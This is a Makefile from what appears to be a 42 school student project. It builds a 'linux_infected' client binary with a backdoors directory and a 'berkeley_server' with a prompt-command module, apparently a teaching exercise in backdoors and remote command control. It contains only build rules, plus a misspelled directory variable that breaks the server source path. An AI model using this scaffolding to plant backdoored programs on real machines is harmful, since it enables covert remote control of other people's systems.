# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2026/01/10 19:15:36 by joesanto          #+#    #+#              #
#    Updated: 2026/01/10 20:12:20 by joesanto         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

CC = cc
FLAGS = -Wall -Wextra -Werror -g
SRCS_DIR = srcs
INFECT_PROGRAM = $(SRCS_DIR)/program_test.c
INCLUDES = -Iincludes

# ----------------------------------- BINS ----------------------------------- #
BIN_DIR = bin
PROGRAM_NAME := $(notdir $(basename $(INFECT_PROGRAM)))

# CLIENT
LINUX_CLIENT = $(BIN_DIR)/linux_infected_$(PROGRAM_NAME)

# SERVER
LINUX_SERVER = $(BIN_DIR)/berkeley_server

# ---------------------------------- SOURCES --------------------------------- #

# CLIENT
CLIENT_DIR = $(SRCS_DIR)/client
BACKDOORS_DIR = $(CLIENT_DIR)/backdoors
CLIENT_CONNECTION_DIR = $(CLIENT_DIR)/socket_client_connection

LINUX_CLIENT_CONNECTION_SRCS = $(CLIENT_CONNECTION_DIR)/berkeley_client_connection.c
LINUX_CLIENT_OBJS += $(LINUX_CLIENT_CONNECTION_SRCS:.c=.o) $(INFECT_PROGRAM:.c=.o)

# SERVER
SERVER_DIR = $(SRCS_DIR)/server
PROMPT_COMMAND_DIR = $(SERVER_DIR)/prompt_command
SERVER_CONNECTION_DIR = $(SERVER_DIR)/socket_server_connection

LINUX_SERVER_MAIN = $(SERVER_DIR)/berkeley_server.c
LINUX_SERVER_CONNECTION_SRCS = $(SERVER_CONNECTIN_DIR)/berkeley_server_connection.c
LINUX_SERVER_OBJS += $(LINUX_SERVER_MAIN:.c=.o) $(LINUX_SERVER_CONNECTION_SRCS:.c=.o)

# -------------------------------- COMPILATION ------------------------------- #

all: $(LINUX_CLIENT) $(LINUX_SERVER)

$(LINUX_SERVER): $(LINUX_SERVER_OBJS)
	$(CC) $^ -o $@

$(LINUX_CLIENT): $(LINUX_CLIENT_OBJS)
	$(CC) $^ -o $@

%.o: %.c
	$(CC) $(FLAGS) $(INCLUDES) -c $< -o $@

clean:
	rm -f $(LINUX_CLIENT_OBJS)

fclean: clean
	rm -f $(LINUX_CLIENT)
	rm -f $(LINUX_SERVER)

re: fclean all
